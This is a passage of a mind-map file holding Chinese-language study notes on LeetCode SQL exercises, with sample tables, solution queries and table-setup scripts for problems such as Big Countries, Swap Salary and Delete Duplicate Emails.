</node>
<node ID="ID_966088318" CREATED="1754749805674" MODIFIED="1754750560258" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL 练习
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1264149475" CREATED="1754750556404" MODIFIED="1754750556406"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      595. Big Countries
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 595. Big Countries" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#595-big-countries">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/big-countries/description/" rel="nofollow">https://leetcode.com/problems/big-countries/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_850945201" CREATED="1754750556407" MODIFIED="1754750556409"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description">
</a>
    <pre>+-----------------+------------+------------+--------------+---------------+
| name            | continent  | area       | population   | gdp           |
+-----------------+------------+------------+--------------+---------------+
| Afghanistan     | Asia       | 652230     | 25500100     | 20343000      |
| Albania         | Europe     | 28748      | 2831741      | 12960000      |
| Algeria         | Africa     | 2381741    | 37100000     | 188681000     |
| Andorra         | Europe     | 468        | 78115        | 3712000       |
| Angola          | Africa     | 1246700    | 20609294     | 100990000     |
+-----------------+------------+------------+--------------+---------------+</pre>
    <p dir="auto">
      查找面积超过 3,000,000 或者人口数超过 25,000,000 的国家。
    </p>
    <pre>+--------------+-------------+--------------+
| name         | population  | area         |
+--------------+-------------+--------------+
| Afghanistan  | 25500100    | 652230       |
| Algeria      | 37100000    | 2381741      |
+--------------+-------------+--------------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1333134926" CREATED="1754750556410" MODIFIED="1754750556412"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution">
</a>
    <pre>SELECT name,
    population,
    area
FROM
    World
WHERE
    area &gt; 3000000
    OR population &gt; 25000000;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1061876922" CREATED="1754750556412" MODIFIED="1754750556414"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema">
</a>
    <p dir="auto">
      SQL Schema 用于在本地环境下创建表结构并导入数据，从而方便在本地环境调试。
    </p>
    <pre>DROP TABLE
IF
    EXISTS World;
CREATE TABLE World ( NAME VARCHAR ( 255 ), continent VARCHAR ( 255 ), area INT, population INT, gdp INT );
INSERT INTO World ( NAME, continent, area, population, gdp )
VALUES
    ( 'Afghanistan', 'Asia', '652230', '25500100', '203430000' ),
    ( 'Albania', 'Europe', '28748', '2831741', '129600000' ),
    ( 'Algeria', 'Africa', '2381741', '37100000', '1886810000' ),
    ( 'Andorra', 'Europe', '468', '78115', '37120000' ),
    ( 'Angola', 'Africa', '1246700', '20609294', '1009900000' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1150855751" CREATED="1754750556414" MODIFIED="1754750556416"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      627. Swap Salary
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 627. Swap Salary" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#627-swap-salary">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/swap-salary/description/" rel="nofollow">https://leetcode.com/problems/swap-salary/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_342687218" CREATED="1754750556416" MODIFIED="1754750556419"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-1">
</a>
    <pre>| id | name | sex | salary |
|----|------|-----|--------|
| 1  | A    | m   | 2500   |
| 2  | B    | f   | 1500   |
| 3  | C    | m   | 5500   |
| 4  | D    | f   | 500    |</pre>
    <p dir="auto">
      只用一个 SQL 查询，将 sex 字段反转。
    </p>
    <pre>| id | name | sex | salary |
|----|------|-----|--------|
| 1  | A    | f   | 2500   |
| 2  | B    | m   | 1500   |
| 3  | C    | f   | 5500   |
| 4  | D    | m   | 500    |</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1508557819" CREATED="1754750556419" MODIFIED="1754750556421"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-1">
</a>
    <p dir="auto">
      两个相等的数异或的结果为 0，而 0 与任何一个数异或的结果为这个数。
    </p>
    <p dir="auto">
      sex 字段只有两个取值：'f' 和 'm'，并且有以下规律：
    </p>
    <pre class="notranslate">'f' ^ ('m' ^ 'f') = 'm' ^ ('f' ^ 'f') = 'm'
'm' ^ ('m' ^ 'f') = 'f' ^ ('m' ^ 'm') = 'f'</pre>
    <p dir="auto">
      因此将 sex 字段和 'm' ^ 'f' 进行异或操作，最后就能反转 sex 字段。
    </p>
    <pre>UPDATE salary
SET sex = CHAR ( ASCII(sex) ^ ASCII( 'm' ) ^ ASCII( 'f' ) );</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_454217194" CREATED="1754750556421" MODIFIED="1754750556429"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-1">
</a>
    <pre>DROP TABLE
IF
    EXISTS salary;
CREATE TABLE salary ( id INT, NAME VARCHAR ( 100 ), sex CHAR ( 1 ), salary INT );
INSERT INTO salary ( id, NAME, sex, salary )
VALUES
    ( '1', 'A', 'm', '2500' ),
    ( '2', 'B', 'f', '1500' ),
    ( '3', 'C', 'm', '5500' ),
    ( '4', 'D', 'f', '500' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1721239104" CREATED="1754750556429" MODIFIED="1754750556431"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      620. Not Boring Movies
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 620. Not Boring Movies" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#620-not-boring-movies">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/not-boring-movies/description/" rel="nofollow">https://leetcode.com/problems/not-boring-movies/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1185671679" CREATED="1754750556431" MODIFIED="1754750556434"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-2">
</a>
    <pre>+---------+-----------+--------------+-----------+
|   id    | movie     |  description |  rating   |
+---------+-----------+--------------+-----------+
|   1     | War       |   great 3D   |   8.9     |
|   2     | Science   |   fiction    |   8.5     |
|   3     | irish     |   boring     |   6.2     |
|   4     | Ice song  |   Fantacy    |   8.6     |
|   5     | House card|   Interesting|   9.1     |
+---------+-----------+--------------+-----------+</pre>
    <p dir="auto">
      查找 id 为奇数，并且 description 不是 boring 的电影，按 rating 降序。
    </p>
    <pre>+---------+-----------+--------------+-----------+
|   id    | movie     |  description |  rating   |
+---------+-----------+--------------+-----------+
|   5     | House card|   Interesting|   9.1     |
|   1     | War       |   great 3D   |   8.9     |
+---------+-----------+--------------+-----------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_70632483" CREATED="1754750556434" MODIFIED="1754750556436"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-2">
</a>
    <pre>SELECT
    *
FROM
    cinema
WHERE
    id % 2 = 1
    AND description != 'boring'
ORDER BY
    rating DESC;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_2840111" CREATED="1754750556437" MODIFIED="1754750556440"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-2">
</a>
    <pre>DROP TABLE
IF
    EXISTS cinema;
CREATE TABLE cinema ( id INT, movie VARCHAR ( 255 ), description VARCHAR ( 255 ), rating FLOAT ( 2, 1 ) );
INSERT INTO cinema ( id, movie, description, rating )
VALUES
    ( 1, 'War', 'great 3D', 8.9 ),
    ( 2, 'Science', 'fiction', 8.5 ),
    ( 3, 'irish', 'boring', 6.2 ),
    ( 4, 'Ice song', 'Fantacy', 8.6 ),
    ( 5, 'House card', 'Interesting', 9.1 );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_774874352" CREATED="1754750556440" MODIFIED="1754750556442"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      596. Classes More Than 5 Students
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 596. Classes More Than 5 Students" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#596-classes-more-than-5-students">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/classes-more-than-5-students/description/" rel="nofollow">https://leetcode.com/problems/classes-more-than-5-students/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1672209328" CREATED="1754750556442" MODIFIED="1754750556443"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-3">
</a>
    <pre>+---------+------------+
| student | class      |
+---------+------------+
| A       | Math       |
| B       | English    |
| C       | Math       |
| D       | Biology    |
| E       | Math       |
| F       | Computer   |
| G       | Math       |
| H       | Math       |
| I       | Math       |
+---------+------------+</pre>
    <p dir="auto">
      查找有五名及以上 student 的 class。
    </p>
    <pre>+---------+
| class   |
+---------+
| Math    |
+---------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1243685788" CREATED="1754750556444" MODIFIED="1754750556446"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-3">
</a>
    <p dir="auto">
      对 class 列进行分组之后，再使用 count 汇总函数统计每个分组的记录个数，之后使用 HAVING 进行筛选。HAVING 针对分组进行筛选，而 WHERE 针对每个记录（行）进行筛选。
    </p>
    <pre>SELECT
    class
FROM
    courses
GROUP BY
    class
HAVING
    count( DISTINCT student ) &gt;= 5;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1130857271" CREATED="1754750556446" MODIFIED="1754750556448"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-3">
</a>
    <pre>DROP TABLE
IF
    EXISTS courses;
CREATE TABLE courses ( student VARCHAR ( 255 ), class VARCHAR ( 255 ) );
INSERT INTO courses ( student, class )
VALUES
    ( 'A', 'Math' ),
    ( 'B', 'English' ),
    ( 'C', 'Math' ),
    ( 'D', 'Biology' ),
    ( 'E', 'Math' ),
    ( 'F', 'Computer' ),
    ( 'G', 'Math' ),
    ( 'H', 'Math' ),
    ( 'I', 'Math' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_492816357" CREATED="1754750556449" MODIFIED="1754750556451"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      182. Duplicate Emails
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 182. Duplicate Emails" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#182-duplicate-emails">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/duplicate-emails/description/" rel="nofollow">https://leetcode.com/problems/duplicate-emails/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_83076635" CREATED="1754750556451" MODIFIED="1754750556456"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-4">
</a>
    <p dir="auto">
      邮件地址表：
    </p>
    <pre>+----+---------+
| Id | Email   |
+----+---------+
| 1  | a@b.com |
| 2  | c@d.com |
| 3  | a@b.com |
+----+---------+</pre>
    <p dir="auto">
      查找重复的邮件地址：
    </p>
    <pre>+---------+
| Email   |
+---------+
| a@b.com |
+---------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1712195880" CREATED="1754750556457" MODIFIED="1754750556459"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-4">
</a>
    <p dir="auto">
      对 Email 进行分组，如果并使用 COUNT 进行计数统计，结果大于等于 2 的表示 Email 重复。
    </p>
    <pre>SELECT
    Email
FROM
    Person
GROUP BY
    Email
HAVING
    COUNT( * ) &gt;= 2;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_671000009" CREATED="1754750556460" MODIFIED="1754750556462"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-4">
</a>
    <pre>DROP TABLE
IF
    EXISTS Person;
CREATE TABLE Person ( Id INT, Email VARCHAR ( 255 ) );
INSERT INTO Person ( Id, Email )
VALUES
    ( 1, 'a@b.com' ),
    ( 2, 'c@d.com' ),
    ( 3, 'a@b.com' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_827103943" CREATED="1754750556463" MODIFIED="1754750556465"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      196. Delete Duplicate Emails
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 196. Delete Duplicate Emails" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#196-delete-duplicate-emails">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/delete-duplicate-emails/description/" rel="nofollow">https://leetcode.com/problems/delete-duplicate-emails/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_65519006" CREATED="1754750556465" MODIFIED="1754750556467"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-5">
</a>
    <p dir="auto">
      邮件地址表：
    </p>
    <pre>+----+---------+
| Id | Email   |
+----+---------+
| 1  | john@example.com |
| 2  | bob@example.com |
| 3  | john@example.com |
+----+---------+</pre>
    <p dir="auto">
      删除重复的邮件地址：
    </p>
    <pre>+----+------------------+
| Id | Email            |
+----+------------------+
| 1  | john@example.com |
| 2  | bob@example.com  |
+----+------------------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_200588967" CREATED="1754750556467" MODIFIED="1754750556469"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-5">
</a>
    <p dir="auto">
      只保留相同 Email 中 Id 最小的那一个，然后删除其它的。
    </p>
    <p dir="auto">
      连接查询：
    </p>
    <pre>DELETE p1
FROM
    Person p1,
    Person p2
WHERE
    p1.Email = p2.Email
    AND p1.Id &gt; p2.Id</pre>
    <p dir="auto">
      子查询：
    </p>
    <pre>DELETE
FROM
    Person
WHERE
    id NOT IN (
        SELECT id 
        FROM ( 
            SELECT min( id ) AS id 
            FROM Person
            GROUP BY email
        ) AS m
    );</pre>
    <p dir="auto">
      应该注意的是上述解法额外嵌套了一个 SELECT 语句，如果不这么做，会出现错误：You can't specify target table 'Person' for update in FROM clause。以下演示了这种错误解法。
    </p>
    <pre>DELETE
FROM
    Person
WHERE
    id NOT IN ( 
        SELECT min( id ) AS id 
        FROM Person 
        GROUP BY email 
    );</pre>
    <p dir="auto">
      参考：<a href="https://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause" rel="nofollow">pMySQL Error 1093 - Can't specify target table for update in FROM clause</a>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1290064715" CREATED="1754750556469" MODIFIED="1754750556471"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-5">
</a>
    <p dir="auto">
      与 182 相同。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1244854243" CREATED="1754750556472" MODIFIED="1754750556473"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      175. Combine Two Tables
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 175. Combine Two Tables" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#175-combine-two-tables">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/combine-two-tables/description/" rel="nofollow">https://leetcode.com/problems/combine-two-tables/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1578354475" CREATED="1754750556474" MODIFIED="1754750556476"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-6">
</a>
    <p dir="auto">
      Person 表：
    </p>
    <pre>+-------------+---------+
| Column Name | Type    |
+-------------+---------+
| PersonId    | int     |
| FirstName   | varchar |
| LastName    | varchar |
+-------------+---------+
PersonId is the primary key column for this table.</pre>
    <p dir="auto">
      Address 表：
    </p>
    <pre>+-------------+---------+
| Column Name | Type    |
+-------------+---------+
| AddressId   | int     |
| PersonId    | int     |
| City        | varchar |
| State       | varchar |
+-------------+---------+
AddressId is the primary key column for this table.</pre>
    <p dir="auto">
      查找 FirstName, LastName, City, State 数据，而不管一个用户有没有填地址信息。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_752582278" CREATED="1754750556476" MODIFIED="1754750556477"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-6">
</a>
    <p dir="auto">
      涉及到 Person 和 Address 两个表，在对这两个表执行连接操作时，因为要保留 Person 表中的信息，即使在 Address 表中没有关联的信息也要保留。此时可以用左外连接，将 Person 表放在 LEFT JOIN 的左边。
    </p>
    <pre>SELECT
    FirstName,
    LastName,
    City,
    State
FROM
    Person P
    LEFT JOIN Address A
    ON P.PersonId = A.PersonId;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1822791661" CREATED="1754750556478" MODIFIED="1754750556479"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-6">
</a>
    <pre>DROP TABLE
IF
    EXISTS Person;
CREATE TABLE Person ( PersonId INT, FirstName VARCHAR ( 255 ), LastName VARCHAR ( 255 ) );
DROP TABLE
IF
    EXISTS Address;
CREATE TABLE Address ( AddressId INT, PersonId INT, City VARCHAR ( 255 ), State VARCHAR ( 255 ) );
INSERT INTO Person ( PersonId, LastName, FirstName )
VALUES
    ( 1, 'Wang', 'Allen' );
INSERT INTO Address ( AddressId, PersonId, City, State )
VALUES
    ( 1, 2, 'New York City', 'New York' );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_183028895" CREATED="1754750556480" MODIFIED="1754750556482"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      181. Employees Earning More Than Their Managers
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 181. Employees Earning More Than Their Managers" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#181-employees-earning-more-than-their-managers">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/employees-earning-more-than-their-managers/description/" rel="nofollow">https://leetcode.com/problems/employees-earning-more-than-their-managers/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_630379574" CREATED="1754750556482" MODIFIED="1754750556485"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-7">
</a>
    <p dir="auto">
      Employee 表：
    </p>
    <pre>+----+-------+--------+-----------+
| Id | Name  | Salary | ManagerId |
+----+-------+--------+-----------+
| 1  | Joe   | 70000  | 3         |
| 2  | Henry | 80000  | 4         |
| 3  | Sam   | 60000  | NULL      |
| 4  | Max   | 90000  | NULL      |
+----+-------+--------+-----------+</pre>
    <p dir="auto">
      查找薪资大于其经理薪资的员工信息。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_472673732" CREATED="1754750556485" MODIFIED="1754750556487"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Solution" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#solution-7">
</a>
    <pre>SELECT
    E1.NAME AS Employee
FROM
    Employee E1
    INNER JOIN Employee E2
    ON E1.ManagerId = E2.Id
    AND E1.Salary &gt; E2.Salary;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_786196709" CREATED="1754750556487" MODIFIED="1754750556489"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      SQL Schema
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: SQL Schema" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#sql-schema-7">
</a>
    <pre>DROP TABLE
IF
    EXISTS Employee;
CREATE TABLE Employee ( Id INT, NAME VARCHAR ( 255 ), Salary INT, ManagerId INT );
INSERT INTO Employee ( Id, NAME, Salary, ManagerId )
VALUES
    ( 1, 'Joe', 70000, 3 ),
    ( 2, 'Henry', 80000, 4 ),
    ( 3, 'Sam', 60000, NULL ),
    ( 4, 'Max', 90000, NULL );</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1352993688" CREATED="1754750556489" MODIFIED="1754789783543"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      183. Customers Who Never Order
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 183. Customers Who Never Order" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#183-customers-who-never-order">
</a>
    <p dir="auto">
      <a href="https://leetcode.com/problems/customers-who-never-order/description/" rel="nofollow">https://leetcode.com/problems/customers-who-never-order/description/</a>
    </p>
  </body>
</html></richcontent>
<node ID="ID_1621941194" CREATED="1754750556491" MODIFIED="1754789783560"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Description
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Description" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/SQL%20%E7%BB%83%E4%B9%A0.md#description-8">
</a>
    <p dir="auto">
      Customers 表：
    </p>
    <pre>+----+-------+
| Id | Name  |
+----+-------+
| 1  | Joe   |
| 2  | Henry |
| 3  | Sam   |
| 4  | Max   |
+----+-------+</pre>
    <p dir="auto">
      Orders 表：
    </p>
    <pre>+----+------------+
| Id | CustomerId |
+----+------------+
| 1  | 3          |
| 2  | 1          |
+----+------------+</pre>
    <p dir="auto">
      查找没有订单的顾客信息：
    </p>
    <pre>+-----------+
| Customers |
+-----------+
| Henry     |
| Max       |
+-----------+</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_300739746" CREATED="1754750556493" MODIFIED="1754789783569"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Solution
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
